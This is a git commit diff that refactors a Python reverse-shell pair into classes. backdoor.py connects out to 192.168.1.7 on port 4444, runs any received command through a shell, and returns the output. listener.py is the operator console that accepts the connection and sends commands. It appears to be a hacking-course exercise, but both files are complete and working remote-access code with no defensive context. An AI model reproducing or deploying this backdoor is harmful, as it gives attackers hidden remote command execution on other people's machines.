056a1686b971607a929ce6aa9936fa244f17c7a0
0x1tsjusthicham <hicham.ezzamzami@gmail.com>
2024-10-10 17:43:12 -0400

    COnvert Into OOP

--- backdoor.py
+++ backdoor.py
@@ -1,17 +1,22 @@
 import socket
 import subprocess
 
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        self.connection.send(b"[+] Connection Successful\n\n")
 
-def run_system_commands(command):
-    return subprocess.check_output(command, shell=True)
+    def run_system_commands(self, command):
+        return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("IP", 4444))
-connection.send(b"[+] Connection Successful\n\n")
+    def run(self):
+        while True:
+            command = self.connection.recv(1024).decode("UTF-8")
+            command_result = self.run_system_commands(command)
+            self.connection.send(command_result)
 
-while True:
-    command = connection.recv(1024).decode("UTF-8")
-    command_result = run_system_commands(command)
-    connection.send(command_result)
+        self.connection.close()
 
-connection.close()
+my_backdoor = Backdoor("192.168.1.7", 4444)
+my_backdoor.run()
--- listener.py
+++ listener.py
@@ -1,19 +1,24 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+class Listener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Wailting Connection")
+        self.connection, address = listener.accept()
+        print("[+] Connection Successful from " + str(address))
+    
+    def execute_commands(self, command):
+        self.connection.send(command.encode())
+        return self.connection.recv(1024).decode("UTF-8")
+    
+    def run(self):
+        while True:
+            command = input(">> ")
+            command_result = self.execute_commands(command)
+            print(command_result)
 
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("IP", 4444))
-listener.listen(0)
-
-print("[+] Wailting Connection")
-
-connection, address = listener.accept()
-
-print("[+] Connection Successful from " + str(address))
-
-while True:
-    command = input(">> ")
-    connection.send(command.encode())
-    command_result = connection.recv(1024).decode("UTF-8")
-    print(command_result)
+my_listener = Listener("192.168.1.5", 4444)
+my_listener.run()
